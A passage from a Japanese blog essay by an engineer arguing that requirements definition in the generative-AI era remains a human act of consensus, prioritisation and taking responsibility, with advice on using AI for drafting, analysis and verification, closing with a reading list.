相手が「この要件で自分の仕事が変わる」ことを理解し、その変化を受け入れている。要件定義で目指すべきは3番目です。1番目の合意は「ハンコを押させた」に過ぎません。2番目は「説明した」に過ぎません。3番目だけが「合意した」と言えます。AIは1番目の合意を効率化できます。議事録を自動生成し、確認依頼を送り、承認を得る。しかし、相手の腹の中にある「本当はこうしたい」を引き出し、対立する利害を調整し、「これでいく」と握り合うプロセスを経て「要件」へと昇華させることはできません。この「コミットメントの合意」こそが、責任を引き受ける人間だけの領域です。「今と同じ」という甘えの排除コミットメントの合意とは、変化を受け入れることです。しかし、人は変化を避けたがる。その典型が「今と同じ」という要件定義です。「今と同じ」は要件定義ではありません。AIは「現行踏襲」を最も簡単に計算しますが、それはビジネスの進化を止める要件定義の放棄に他なりません。なぜ人は「今と同じ」を選ぶのか。私の経験では、3つのパターンがあります。責任回避型: 「今と同じ」と言っておけば、何か問題が起きても「前からそうだった」と言い訳できる。新しいことを提案すると、その責任を負わなければならない。思考停止型: 「今と同じ」は考えなくていい。現状を分析し、あるべき姿を構想し、そのギャップを埋める——この知的作業を放棄できる。合意回避型: 新しい要件を定義すると、関係者との合意形成が必要になる。「今と同じ」なら、誰も反対しない（ように見える）。どのパターンも、本質は同じです。痛みを避けている。しかし、痛みを先送りにしても、痛みは消えません。むしろ、システム稼働後に「使えない」という形で、より大きな痛みとなって返ってきます。現状（As-Is）からあるべき姿（To-Be）への差分を定義し、変化に伴う痛みを受け入れることこそが要件定義の本質です。要件定義とは「責任」の契約である発注者の責任という冷徹な事実これは冷徹な事実ですが、要件定義は発注者の責任です。要件定義とは「使える」業務システムを定義することです。動くシステムではなく、使えるシステム。この違いは大きい。私が冒頭で作った検索機能は「動く」システムでした。しかし「使える」システムではなかった。AIがどれだけ「効率的な設計」を提示しても、それが現場の業務を壊したり、利益を生まなかったりしたとき、AIは責任を取れません。要件定義とは、「このシステムでビジネスを勝たせる」とオーナーが腹を括る行為であり、説明責任（Accountability）を伴う意思決定なのです。アプリケーションオーナー制度私が有効だと感じているのは、「アプリケーションオーナー制度」という考え方です。システムをIT部門の「資産」にせず、利益を回収する責任を持つ「ビジネス側」の持ち物とします。なぜこれが重要なのか。オーナーが不在のプロジェクトで何が起きるか、私は何度も見てきました。「誰に聞けばいいか分からない」問題: 要件の詳細を詰めようとすると、「それは〇〇部に聞いて」「いや、うちじゃない」とたらい回しにされる。最終決定権者がいない。「みんなで決めた」問題: 会議で合意したはずの要件が、後から「私は賛成したけど本当は反対だった」と覆される。全員が責任を分散しているので、誰も責任を取らない。「IT部門が決めて」問題: 業務のことを一番知っているはずの現場の人たちが、技術的な判断をIT部門に丸投げする。IT部門は業務を知らないので、動くが使えないシステムができる。オーナー制度は、この3つの症状への処方箋です。オーナーシップ: 「このシステムは自分のもの」という認識を持つ。自分の仕事を具体化するための、自分自身の仕事である。最終責任: 要件の詳細が固まるまで対話を繰り返し、「これでいく」と言う権限と責任を持つ。なぜ「痛みを伴う」のか選択には痛みが伴います。選択: どの課題を解決し、どの要望を切り捨てるか妥協: 予算と納期の制約の中で、何を「諦める」か限られた工期やコストの中で「やらないこと」を決める優先順位付けは、最も苦しい決断です。この痛みを引き受けることこそが、要件定義の本質です。AIがどれだけ効率的にコードを書いても、そのシステムが利益を生まなかったときの「痛み」を肩代わりしてはくれません。WhyからWhatへ繋ぐリザルトチェーン要件の階層構造「Why」を問わずに「What（機能）」をAIに作らせることは、目的地を決めずにアクセルを全開にすることと同じです。私は要件を3つの階層で捉えるようにしています。IPAのガイドでも同様の分類がなされています。 階層           IPAの定義                   問い              内容                                                  Why / Who  利害関係者の要求 (BR)   なぜ、誰のために  利用者が「何を成し遂げたいか」というビジネス目標      What       システム要求 (SR)       何を作るか        目標達成のためにシステムが「どう振る舞うべきか」      How well   ソフトウェア要求 (SRS)  どれだけうまく    プログラムが満たすべき具体的な仕様（機能・性能など） 要件定義とは、この3つのレベルを垂直統合する行為と言えます。冒頭で触れた私の失敗——「検索機能」を作ったが「探す手間を減らす」ことを理解していなかった——は、まさに利害関係者の要求（Why）を無視して、いきなりシステム要求（What）に飛びついた結果でした。なぜ人はWhyを飛ばすのか。私なりに分類すると、3つの理由があります。Whatの方が具体的で安心する: 「検索機能を作る」は明確だ。進捗も測れる。一方「探す手間を減らす」は曖昧だ。何をもって達成とするのか、分かりにくい。人は曖昧さを嫌う。Whyを問うと「分からない」が露呈する: なぜこの機能は必要か。誰のためか。本当に必要か。この問いに答えられない人は多い。答えられないと恥ずかしいので、問わないことにする。Whyは政治的に危険: 「なぜこの機能が必要なのか」を突き詰めると、「実は必要ない」という結論に至ることがある。すると、その機能を要望した人の面子を潰すことになる。面倒を避けるために、Whyを問わない。いずれも、本質は同じです。Whyを問うことは、不確実性と向き合うことです。不確実性は不快です。だから避ける。しかし、避けた不確実性は消えません。プロジェクトの最後に「これじゃない」という形で顕在化します。リザルトチェーンで因果関係を証明する私が有効だと感じているのは「リザルトチェーン」という考え方です。獲得したい「最終ビジネス成果（Why）」と、それを実現するための「具体的機能（What）」を鎖のようにつなぎ、因果関係を証明します。IT施策: 具体的機能（AIが生成するもの）中間成果: その機能が業務に与える好影響最終ビジネス成果: 売上向上、コスト削減などの経営目標このチェーンを設計し、その妥当性に判をつくことこそが要件定義の核心です。AIが生成した機能リストの先に、どのようなビジネス上の「果実」があるのかを論理的に証明するのは、人間に残された高度な知能活動です。開発コストの大半は「手戻り」に消えているソフトウェア要求工学の古典『Software Requirements 3』によれば、開発における手戻りはコスト全体の30〜50%を消費します。そのうち70〜85%が要件の間違いに起因するといいます（Karl Wiegers & Joy Beatty, 2013）。つまり、開発チームが残業している夜の大半は、「最初に何を作るか間違えた」ことへの贖罪なのです。AIはこの贖罪の時間を短くしてくれません。間違いをより速く積み上げるだけです。AIにできること、できないこと2025年のAIは、多くのことができます。まずその能力を正確に把握しておくことが重要です。過小評価すれば使いこなせず、過大評価すれば失敗します。AIは問いを立てることもできるAIは問いを立てられます。「このプロジェクトで考慮すべき観点は何か」と聞けば、AIは網羅的なリストを返してくれます。ユーザー体験、セキュリティ、スケーラビリティ、コスト、保守性——私が思いつかなかった観点まで提示してくれることもあります。問いを立てる能力において、AIはすでに人間を補完できるレベルに達しています。要件定義の各フェーズでAIを活用するでは、具体的にどう活用するか。私が実践している方法を紹介します。フェーズ1：要求の洗い出しステークホルダへのヒアリング前に、AIに「このプロジェクトで聞くべき質問リスト」を生成させます。「ECサイトのリニューアルプロジェクトで、業務部門に確認すべき観点を20個挙げて」と指示すると、私が見落としていた観点が出てくることがあります。ヒアリング後には、議事録をAIに読ませ、「この議事録から抽出できる要求を一覧化して」と指示します。人間が手作業で整理するより速く、抜け漏れも減ります。フェーズ2：要件の具体化曖昧な要求を具体的な要件に変換する作業でも、AIは役立ちます。「『使いやすいシステム』という要求を、測定可能な要件に分解して」と指示すると、「レスポンス時間」「操作ステップ数」「エラー率」といった具体的な指標に落とし込んでくれます。しかし、ここで出てきた指標が「このプロジェクトにとって適切か」を判断するのは人間です。AIが提案した「レスポンス時間1秒以内」が、本当にこのシステムに必要かどうか。それはビジネスの文脈を理解している人間が決めます。フェーズ3：影響分析「この要件を実装した場合、既存システムにどんな影響があるか」という分析も、AIに補助させられます。システム構成図やデータフロー図をAIに読ませ、「この変更による影響範囲を洗い出して」と指示する。網羅性の担保にAIを使い、最終的な判断は人間が行います。フェーズ4：ドキュメント生成要件定義書のドラフト作成は、AIが得意な領域です。「以下の要件リストを、IPAのガイドラインに沿った形式でドキュメント化して」と指示すれば、体裁の整った文書が出てきます。人間は、その内容の正確性と、ステークホルダに伝わる表現かどうかをレビューします。しかしAIは「選べない」問題は、その先です。AIは10個の選択肢を提示できます。それぞれのメリット・デメリットを分析できます。トレードオフを可視化できます。しかし、「どれを選ぶか」を決めることはできません。「パフォーマンスを優先すべきか、開発速度を優先すべきか」——AIはこの問いに対して、両方の観点から分析を提供してくれます。しかし「我々はパフォーマンスを選ぶ」と宣言できません。なぜか。AIは責任を引き受けられないからです。「何でも作れる時代」に、なぜ私たちは作れないのか。その問いと向き合った記事を書いています。syu-m-5151.hatenablog.com腹を括るとは何かでは、「責任を引き受ける」とは具体的にどういうことでしょうか。私はこれを「腹を括る」という言葉で捉えています。「腹を括る」とは、不完全な情報の中で、それでも決断を下すことです。すべての情報が揃うことはありません。すべてのリスクを排除できません。それでも、「我々はこれでいく」と決める。その決断には、必ず「もし間違っていたら」という不安がつきまといます。AIにはこの不安がありません。午前3時に目が覚めて「あの選択は本当に正しかったのか」と天井を見つめることもない。胃が痛くなることもない。だから、決断できません。決断とは、胃を痛めることの引き受けなのかもしれません。AIは確率を計算できます（厳密には「計算」ではなくパターン認識ですが、ここでは便宜上こう呼びます）。リスクを列挙できます。しかし、「このリスクを取る」と決断できません。決断とは、不確実性を引き受けることであり、責任を引き受けることだからです。「腹を括った」と言える条件では、腹を括ったと言える判断には、どんな条件が必要でしょうか。私なりに整理してみます。第一に、代替案を知っていること。「これしかない」と思い込んでいる状態は、腹を括ったとは言えません。A案、B案、C案があり、それぞれのリスクとリターンを理解した上で「A案でいく」と決める。選択肢を知らずに選んだものは、選択ではありません。第二に、失敗したときのシナリオを想定していること。「これでうまくいく」と楽観しているだけでは、腹を括ったとは言えません。「もし失敗したら、こうなる」「そのとき、こう対応する」という覚悟があるかどうか。最悪のケースを直視した上で、それでも進む決断が「腹を括る」です。第三に、自分の名前で決めること。「みんなで決めた」「上が言ったから」という言い方ができる決断は、腹を括っていません。「私が決めた。責任は私にある」と言えるかどうか。決定権者が明確であること。エンジニアとしてプロジェクトに参加するとき、私は自分に問いかけます。「この技術選定は、自分の名前で決めたか」「このアーキテクチャは、自分の名前で提案したか」。アーキテクトは技術的な意思決定者です。「チームで検討した結果」という言い方をしがちですが、最後に「私がこの設計を推奨する」と言えるかどうか。それが腹を括るということです。うまくいかないときに次の手を打つAIが生成したコードにバグがあったとき、どうするか。エンジニアなら答えは明確です。原因を調べて、修正して、再デプロイする。うまくいかなければ別のアプローチを試す。それでもダメなら、いったん切り戻して仕切り直す。この「次の手を打つ」判断は、今のところ人間がやるしかありません。選択の本質は、うまくいかなかったときに次の手を打つことにあります。AIが選択しても、その後の軌道修正——関係者との再調整、代替案の実行、撤退の判断——をするのは、今のところ人間しかいません。合意形成と対立する「正しさ」の調整なぜ合意が難しいのか合意形成が難しいのは、なぜでしょうか。単純に「意見が違う」だけではありません。もっと根深い問題があります。それは、関係者がそれぞれ異なるナラティブ（物語）——世界を解釈するための枠組み——を生きていることです。経営者は「コスト削減こそ正義」という物語を生きている。エンジニアは「技術的負債は悪」という物語を生きている。現場は「今の仕事を楽にしたい」という物語を生きている。三者が同じ会議室に座っているが、実は三つの異なる言語を話しています。どれも正しい。どれも間違っていません。だが、同時に全てを満たすことはできません。問題は、人は自分のナラティブの外に出られないことです。経営者から見れば、エンジニアは「コストを無視した理想論者」に見えます。エンジニアから見れば、経営者は「技術負債を無視した短期思考」に見えます。お互いが、相手を「間違っている」と感じている。しかし実際には、どちらも間違っていません。違う物語を生きているだけです。これを認めることが、合意形成の第一歩になります。では、どうすれば認められるのか。私の経験では、「こう言えばうまくいく」という魔法の言葉はありません。テクニックの問題ではないのです。大切なのは、相手の物語を理解しようとする姿勢で議論を続けること。その姿勢を持ち続けることでしか、ナラティブの壁は越えられません。私自身、エンジニアとしてこれを学びました。技術的に正しいことと、プロジェクトにとって正しいことは、同じではありません。たとえば「マイクロサービス化すべきだ」という技術的に正しい主張が、今のチームのスキルや予算を考えると現実的ではないことがあります。相手の立場——チームの現状、予算の制約、経営の優先順位——を理解しようとして初めて、現実的な落とし所が見えてきます。アーキテクトの仕事は、技術的な正しさを追求することではなく、プロジェクトの文脈の中で最適解を見つけることです。主観を可視化するナラティブの衝突を解消するには、まず「見える化」が必要です。言葉で議論していると、同じ言葉に違う意味を込めていることに気づきません。私がよく使うのは、ホワイトボードに関係者の立場と関心事を図示する方法です。IPAのガイドでは「リッチピクチャ」と呼んでいます。言葉では表現しづらい関係性を一枚の絵で表現し、「あなたはこう見えているんですね」と確認する。これだけで誤解が減ります。合意形成を加速させるテクニック私の経験で有効だったテクニックをいくつか挙げます。IPAのガイドでも同様の手法が推奨されています。当事者意識（オーナーシップ）の醸成単なるヒアリングではなく、ワークショップなどを通じて関係者が議論し、相互理解を深めるプロセスを持ちます。自分たちが決めたという意識がなければ、稼働後の不満につながります。相手の視点に合わせた資料の準備成果物をそのまま見せるのではなく、説明相手の関心事に合わせた資料を用意します。経営層向け: 「ビフォーアフター図（B/A図）」を用い、何が変わって何が良くなるのか、投資対効果を端的に伝える現場のリーダー向け: 新しい業務プロセスがどうなるか、業務フローを用いて具体的な変化を説明する「声の大きい人」のコントロール特定の意見に流されないよう、客観的な評価指標（優先順位の基準）を盾にし、ファシリテーターが議論を統制します。エスカレーションパスの確立現場で合意できない対立については、上位層による意思決定機関（ステアリングコミッティ）へ迅速にエスカレーションし、プロジェクトを停滞させない仕組みを事前に作っておきます。合意形成でAIを活用する合意形成という人間臭い作業でも、AIは補助的な役割を果たせます。相手の立場を理解するための困難打ち。会議の前に、AIに「経営者の視点から、このシステム投資をどう評価するか」と聞いてみます。自分とは違うナラティブを疑似体験できます。「この提案を受けた営業部長は、どんな懸念を持つか」とAIに聞くことで、想定問答を準備できます。議論の整理と論点の抽出。会議が紛糾したとき、議事録をAIに読ませて「この議論の論点を整理して」と指示すると、感情的になっている参加者には見えなくなった構造が見えてきます。「経営層はコストを重視、現場は使いやすさを重視、エンジニアは保守性を重視」という対立構造を可視化できます。説明資料の自動生成。相手に合わせた資料の準備にも、AIは使えます。「この技術仕様を、経営層向けにROIの観点で説明する資料に変換して」と指示すれば、一次ドラフトが生成されます。ゼロから書くより効率的です。合意の言語化。合意に至ったとき、その内容を正確に文書化することにもAIは役立ちます。「この会議で合意された内容を、後から『言った言わない』にならないように文書化して」と指示すれば、曖昧さを排除した合意文書のドラフトが得られます。しかし、AIが補助できるのは合意形成の準備と記録です。相手の感情を読み取り、対立を調整し、「これでいきましょう」と握り合うプロセス自体は、人間同士の対話でしかできません。AIは通訳であり、ファシリテーターではありません。対話の本質と、対話を阻む構造的な問題については、以下の記事でより詳しく論じています。syu-m-5151.hatenablog.com優先順位付けという最もクリエイティブな「棄却」「全部やる」の誘惑「全部やる」と言った瞬間、会議室は平和になります。誰も傷つかない。誰も責められない。しかし3ヶ月後、プロジェクトは炎上する。「全部やる」は、将来の自分への借金です。利子は複利で増えます。問題は個人の心理だけではありません。組織の構造が、選択を妨げていることがあります。まず、インセンティブの問題があります。営業部長は営業の数字で評価される。開発部長は開発の成果で評価される。全社最適より部門最適が優先される構造になっています。次に、権限の曖昧さがあります。誰が「やらない」と決める権限を持っているのか。多くの組織で、これが不明確です。だから、誰も決めない。決めなければ、責任を問われません。「全部やる」は、個人の弱さであると同時に、構造の帰結でもあります。客観的な6つの判断基準AIはあらゆる可能性を提示しますが、リソース（工期・コスト・人）は有限です。何かを選ぶことは、何かを諦めること。この優先順位付けこそが、最もクリエイティブで苦しい決断の場です。優先順位を「なんとなく」で決めると、声の大きい人の意見が通ってしまいます。私は以下の6つの指標で多角的に評価するようにしています。IPAのガイドでも同様の基準が示されています。有効性: 目的や目標にどれだけ貢献するか（達成効果）必要性: 法制度対応、内部統制、社会的責任などの観点で不可欠か緊急性: 期限が明確で、急を要するか費用: 実現や運用にどれだけのコストがかかるか実現性: 技術的・人的に本当に実現可能か新たな問題: その要求を実現することで、別の問題が発生しないかMoSCoW分析という「捨てる」ための枠組みすべてを「必須」とせず、MoSCoW分析を用いて、勇気を持って「要求を捨てる」ことが必要です。M (Must): これがないと目的を達成できない必須の要求S (Should): 必須ではないが、重要な推奨要求C (Could): あれば良いレベルの要求W (Won\'t): 今回は見送る、または不要な要求柔軟で変化に強いシステムを作るには、要求を抑え込み、シンプルでスリムな状態を維持する「捨てる勇気」が必要です。AIが「What（何を作るか）」の選択肢を無限に生成するからこそ、人間はこの枠組みを駆使して価値あるものだけを選ぶ必要があります。優先順位付けでAIを活用するここでもAIは強力な補助ツールになります。比較分析の自動化。100個の要求がリストアップされたとき、それぞれを6つの指標で評価するのは膨大な作業です。AIに「この要求リストを、有効性・必要性・緊急性・費用・実現性・新たな問題の6軸で評価して」と指示すれば、一次評価を自動化できます。トレードオフの可視化。「要求Aを優先すると、要求Bにどんな影響があるか」という依存関係の分析も、AIに補助させられます。複雑に絡み合った要求間の関係を整理し、「これを選ぶと、あれが犠牲になる」という構造を可視化できます。過去事例の参照。類似プロジェクトでどんな優先順位付けがなされたか。過去の要件定義書をAIへ渡し、傾向を分析させることもできます。「過去5年間のプロジェクトで、結局Won\'t判定となった要求の特徴は何か」といった分析が可能です。しかし、最終的な優先順位を決めるのは人間です。AIは「この要求は有効性が高い」と分析できます。だが「有効性が高いから採用する」とは決断できません。有効性が高くても、今のチームには実現できない。費用が低くても、ビジネス的な価値がない。こうした判断は、プロジェクトの文脈を理解している人間にしかできません。「何をやらないか」を決めることの本質と、戦略的思考については、以下の記事でより詳しく論じています。syu-m-5151.hatenablog.com検証と妥当性確認という「正しさ」を問う2つの視点要件を選び、優先順位を付けた。では、その選択は正しかったのか。要件定義には、選んだ後に「正しさ」を確認する作業があります。ここで重要なのは、「正しさ」には2つの意味があるということです。Verification と ValidationAI時代のエンジニアの価値は、計算機的な「検証（Verification）」から、人間的な「妥当性確認（Validation）」へと移っています。検証 (Verification): 記述された要件が、要求を抜け漏れなく満たしているかという「計算的」チェック。これはAIでも補助可能である。妥当性確認 (Validation): その要求自体が、本当にビジネス目的を達成できるものかという「意志」の確認。後者は「納得」という感情の着地点を見つける泥臭い人間活動（合意形成）であり、これが欠けた要件定義は、2025年においても失敗を運命づけられています。AIは「正しく作る」ことを補助できます。しかし「正しいものを作っているか」を問い続けるのは人間の仕事です。検証フェーズでAIを活用するVerification（検証）は、AIが最も力を発揮できる領域です。要件の整合性チェック。「この要件定義書の中で、矛盾している記述はないか」とAIに分析させます。「画面Aでは『即時反映』と書いてあるが、画面Bでは『バッチ処理』と書いてある。これは矛盾ではないか」といった指摘が得られます。人間の目では見落としがちな不整合を、AIは網羅的にチェックできます。抜け漏れの検出。「この要件定義書で、考慮されていない観点はないか」とAIに問いかけます。「エラー時の挙動が定義されていない」「権限管理について記述がない」といった抜け漏れを指摘してくれます。テストケースの自動生成。「この要件から、テストケースを生成して」と指示すれば、要件を満たしているかどうかを確認するためのテストシナリオが自動生成されます。一方で、Validation（妥当性確認）は人間の仕事です。「この要件が本当にビジネス目的を達成できるか」は、ビジネスの文脈を理解している人間にしか判断できません。AIは「要件が論理的に整合している」ことは確認できますが、「この要件でユーザーが幸せになるか」は判断できません。非機能要求と経営リスクを引き受ける覚悟性能、セキュリティ、可用性といった「非機能要求」は、もはやエンジニアのこだわりではなく、経営そのものです。IPAの「非機能要求グレード」を活用し、可用性、セキュリティ、運用・保守性などの各項目について、ビジネスの特性に合わせた「レベル」を決定します。可用性: 「24時間365日止まらない」という要求には膨大なコストがかかるセキュリティ: 利便性を損なう可能性があっても守るべき情報の範囲を合意するAIは「コストとリスクのバランス表」を出すことはできます。しかし、万が一の事態に「私が責任を取る」と宣言し、トレードオフに決着をつけることはできません。システムの事情を人間に寄せるここまで、要件定義の「決める」「合意する」「選ぶ」という側面について書いてきました。ここからは、もう1つの重要な側面——伝える——について書きます。エンジニアの本当の仕事私は長い間、エンジニアの仕事は「技術的に優れたシステムを作ること」だと思っていました。パフォーマンスを最適化し、スケーラブルに設計し、セキュリティを担保する。それが専門家としての価値だと。しかし今は違う考えを持っています。エンジニアの本当の仕事は、システムの事情を人間に寄せることです。システムには事情があります。データベースには制約がある。ネットワークには遅延がある。メモリには限界がある。これらの「システムの都合」をそのままユーザーに押し付けると、使いにくいシステムができあがります。「処理中はお待ちください」という画面を見せるのは簡単です。しかし、バックグラウンドで処理を行い、完了したら通知するという設計にすれば、ユーザーは待たなくていい。もう少し例を挙げます。「入力エラーです」→「電話番号は090-1234-5678の形式で入力してください」「データがありません」→「〇〇で検索してみてください」または「似たデータはこちら」「権限がありません」→「管理者の〇〇さんに申請してください」（申請リンク付き）パターンは同じです。エラーの原因を伝えるのではなく、次のアクションを伝える。これが「システムの事情を人間に寄せる」ということです。AIがこの橋渡しを加速するここに生成AIが加わることで、「システムの事情を人間に寄せる」作業は劇的に変わります。エラーメッセージの設計を例に考えます。従来、エンジニアは「このエラーが出たら、どう説明するか」を一つひとつ考えていました。しかし今は、「このエラーコードのリストを、エンドユーザー向けの説明文へ変換して」とAIに指示できます。数百のエラーメッセージを、一貫したトーンで、人間に寄せた表現へ変換できるのです。ドキュメント生成も同様です。APIの仕様書をAIへ渡し、「エンジニアではない人が読んでも分かる説明を書いて」と指示する。技術的な正確さを保ちつつ、ビジネス側に伝わる表現へ変換できます。アーキテクトとしての視点から言えば、AIは「翻訳作業の自動化」を可能にします。システムの事情を人間に寄せる作業は、これまで経験と勘に頼っていました。しかし今は、AIにパターンを学習させ、大量の翻訳を一貫した品質で行えます。しかし、注意が必要です。AIが生成した「人間に寄せた表現」が、本当にユーザーに伝わるかは別問題です。AIは「分かりやすそうな文章」を生成できますが、ユーザーが実際に理解するかは検証しなければ分かりません。エンジニアの仕事は、AIが生成した翻訳を検証し、改善のサイクルを回すことに移行します。要件定義はその橋渡し要件定義は、ビジネスの世界とシステムの世界を橋渡しする行為です——と言うのは簡単です。問題は、同じ言葉でも意味が違うことにあります。例えば「リアルタイム」という言葉。エンジニアが「リアルタイム」と聞くと、脳内では即座にWebSocketの設計が始まる。ポーリング間隔は100ミリ秒か、いや50ミリ秒か。一方、ビジネス側の「リアルタイム」とは何か。聞いてみると「1分以内」だったりする。エンジニアは100ミリ秒の世界で戦っていたが、相手は60秒の世界にいた。600倍のズレです。この認識の溝を埋めないまま開発を進めると、3ヶ月後に「なんでこんなに重いんですか」と言われる。過剰品質もまた罪なのです。橋渡しとは、この言葉の翻訳作業のことです。「リアルタイムとは、具体的にどのくらいの頻度で更新されればいいですか」と聞く。「1時間に1回で十分」と返ってくるでしょう。その瞬間、要件の解像度が上がります。「技術的にはできません」で終わらせるのは簡単です。しかし、「技術的には難しいですが、こういう代替案ならできます」と提案できるかどうか。それがプロフェッショナルとアマチュアの違いです。「要件定義」という言葉のズレ業界・組織によって指す行為が違うここで立ち止まりたいです。あなたの職場での「要件定義」と、私が語っている「要件定義」は、同じものでしょうか。正直に告白すると、この言葉ほど組織や文脈によって意味が異なるものはありません。SIerでは、要件定義は「顧客の要望を文書化すること」を指すことが多いです。RFP（提案依頼書）を受け取り、要件定義書を作成し、顧客の承認を得る。事業会社では、要件定義は「何を作るかを決めること」を指すことが多いです。文書化より意思決定が重視されます。スタートアップでは、要件定義という言葉自体はあまり使われません。「仮説を立てて検証する」「ユーザーの声を聞いて方向転換する」——こうした活動は要件定義に相当しますが、そう呼ばれることは少ないです。ズレを防ぐために1つのアプローチは、最初に「要件定義」の意味を擦り合わせることです。プロジェクトの冒頭で、「このプロジェクトにおいて要件定義とは何を指すか」を明示的に合意する。面倒ですが、後のズレを防げます。私がこの記事で「要件定義とは合意形成であり、責任の引き受けである」と定義したのも、そうした擦り合わせの試みです。生成AI時代にエンジニアはどう向き合うか生成AIの登場によって、「要件定義」という言葉のズレはより複雑になります。「AIに要件定義させる」という幻想。クライアントから「AIに要件定義させればいいのでは」と言われることが増えました。しかし、ここには根本的な誤解があります。AIは「要件をドキュメント化すること」はできます。だが「要件を決めること」はできません。なぜなら、要件を決めるとは責任を引き受けることだからです。エンジニアとして、私はこの問いにこう答えます。「AIは要件定義の作業を効率化します。しかし要件定義の本質——選択と責任——は人間のままです」と。アーキテクトの新しい役割。生成AI時代のアーキテクトには、新しい役割が生まれています。それは「AIとの協働プロセスを設計する」ことです。どの作業をAIに任せ、どの判断を人間が行うか。この分界点を設計することが、アーキテクトの仕事に加わりました。例えば、以下のような判断が必要になります。AIに任せるべきこと: 要件の文書化、過去事例の調査、影響範囲の分析、選択肢の列挙人間が判断すべきこと: 対立する要件の優先順位付け、ステークホルダとの合意形成、「これでいく」という最終決定組織によって「AI活用」の意味も違う。SIerでは「AIで提案書の品質を上げる」だろう。事業会社では「AIでプロトタイプを高速に作り、検証する」だろう。スタートアップでは「AIで仮説検証のサイクルを速める」だろう。要件定義という言葉のズレと同様に、「AIを活用する」という言葉もズレます。だからこそ、プロジェクトの冒頭で「このプロジェクトにおいてAIをどう使うか」も明示的に合意すべきです。腹を括って成功した経験ここまで抽象的な話が続いたので、具体的な経験を1つ書きます。冒頭で「検索機能を作ったが使われなかった」失敗を書きました。今度は、逆のケースです。あるプロジェクトで、私たちは「検索機能を作らない」という判断をしました。クライアントは検索機能を強く要望していました。競合製品にはすべて検索機能がある。チーム内にも「作るべきだ」という声がありました。しかし私は、ユーザーインタビューの結果を見て、違う結論に達しました。ユーザーが本当に困っていたのは「探す」ことではなく、「何を探せばいいか分からない」ことでした。検索機能を作っても、検索ワードが浮かばないユーザーには役に立ちません。私は「検索機能は作らない。代わりに、よく使う項目を自動で上位に表示する仕組みを作る」と提案しました。クライアントとチームから、大きな反対はありませんでした。「もし改善しなかったら、そのときに検索機能を作りましょう」という落とし所で合意しました。結果は成功でした。リリース後、ユーザーからの問い合わせが激減しました。「欲しい情報がすぐ見つかる」という評価を得ました。振り返ると、この判断には先ほど挙げた3つの条件がすべて揃っていました。代替案（検索機能を作る）を知っていた。失敗したときのシナリオ（クライアントからのクレーム、追加開発のコスト）を想定していた。そして、自分の名前で決めた。腹を括れば、成功と失敗の両方から学べます。腹を括らなければ、どちらの結果からも何も得られません。おわりにこの記事では、AI時代の要件定義について考えてきました。2025年現在、AIの能力は驚くほど高くなりました。コードを書くだけでなく、要件の分析・矛盾の指摘・テストケース生成・ドキュメント作成まで行えます。AIエージェントは自律的にタスクを実行し、エラーがあれば自分で修正します。それでも、要件定義の本質は変わりません。ステークホルダのニーズを実現可能な形に変換し、合意を取り付けるプロセス。対立するナラティブを調整し、「これでいく」と腹を括る行為。うまくいかなければ次の手を打つ覚悟。これは、人間同士の営みであり続けます。変わるのは、道具です。AIは問いを立てられます。選択肢を提示できます。分析もできます。リスクを列挙できます。これらを使いこなせば、要件定義の質は上がります。しかし、最後に「これでいく」と決めるのは人間です。責任を引き受けるのも人間です。「AIに最適化された要件定義」を一から発明する必要はありません。IPAのガイドに体系化された「128の勘どころ」は、数十年にわたる失敗と成功の蓄積です。この基盤の上に、AIという新しい道具を載せていく。それが現実的なアプローチだと私は考えています。冒頭で触れた「仕様通りに作ったが使われなかった」システム。あのとき私に足りなかったのは、技術力ではありませんでした。「なぜこれを作るのか」を問う力。「これでいく」と決める覚悟。うまくいかなければ別の手を打つ姿勢。そういうものでした。痛みのない決断は、決断ではなく計算です。AIは計算が得意です。しかし、決断はできません。決断とは、不確実性を引き受けることであり、責任を引き受けることだからです。エンジニアとして、アーキテクトとして、私たちはこの時代にどう立ち向かうべきでしょうか。私の答えはシンプルです。AIを使いこなしながら、決断する力を磨く。AIに任せられる作業は任せる。しかし、最後に「これでいく」と決めるのは自分です。技術選定、アーキテクチャ設計、トレードオフの判断——これらの決断を、自分の名前で行う。うまくいかなければ、次の手を打つ。この姿勢は、AIが進化しても変わりません。この10年間、私はコードを書くことに時間を使ってきました。そのうちどれだけが「贖罪」だったかは、あまり考えたくありません。これからの10年は、「何を作るべきか」を選ぶことに時間を使いたい。選んで、合意を取り付けて、責任を引き受けて、うまくいかなければ次の手を打つ。その繰り返しに時間を使いたいと思っています。参考資料IPAガイド本稿で参照したIPAの「ユーザのための要件定義ガイド 第2版」は、以下から無料でダウンロードできます。「128の勘どころ」として、要件定義の成功に導くための具体的なノウハウが体系化されています。www.ipa.go.jp参考ブログ要件定義を始める前に、以下の記事を読むことを強くおすすめします。本稿で述べた「要件定義とは合意形成である」という主張の基盤となる考え方を、実践的な視点から解説しています。agnozingdays.hatenablog.comagnozingdays.hatenablog.com参考書籍はじめよう！ 要件定義 ～ビギナーからベテランまで作者:羽生章洋技術評論社Amazonはじめよう！プロセス設計 ～要件定義のその前に作者:羽生 章洋技術評論社Amazonはじめよう! システム設計 ～要件定義のその後に作者:羽生 章洋技術評論社Amazonだまし絵を描かないための－－要件定義のセオリー作者:赤俊哉リックテレコムAmazon要件最適アーキテクチャ戦略 (Object oriented selection)翔泳社Amazon社内政治の科学　経営学の研究成果 (日本経済新聞出版)作者:木村琢磨日経BPAmazon社内政治の教科書作者:高城 幸司ダイヤモンド社Amazonソフトウェアアーキテクトのための意思決定術　リーダーシップ／技術／プロダクトマネジメントの活用作者:Srinath Perera,島田 浩二インプレスAmazonSoftware Requirements Essentials: Core Practices for Successful Business Analysis (English Edition)作者:Wiegers, Karl,Hokanson, CandaseAddison-Wesley ProfessionalAmazon正しいものを正しくつくる　プロダクトをつくるとはどういうことなのか、あるいはアジャイルのその先について作者:市谷 聡啓ビー・エヌ・エヌ新社Amazon作る、試す、正す。　アジャイルなモノづくりのための全体戦略作者:市谷 聡啓ビー・エヌ・エヌAmazonソフトウェアアーキテクチャの基礎 ―エンジニアリングに基づく体系的アプローチ作者:Mark Richards,Neal Ford,島田浩二オライリージャパンAmazonアーキテクトの教科書 価値を生むソフトウェアのアーキテクチャ構築作者:米久保 剛翔泳社Amazonソフトウェアアーキテクチャメトリクス ―アーキテクチャ品質を改善する10のアドバイス作者:Christian Ciceri,Dave Farley,Neal Ford,Andrew Harmel-Law,Michael Keeling,Carola Lilienthal,Jo\xe3o Rosa,Alexander von Zitzewitz,Rene Weiss,Eoin Woodsオーム社Amazon【Amazon.co.jp 限定】失敗の科学 (特典: マシューサイド\xd7竹下隆一郎 対談PDF 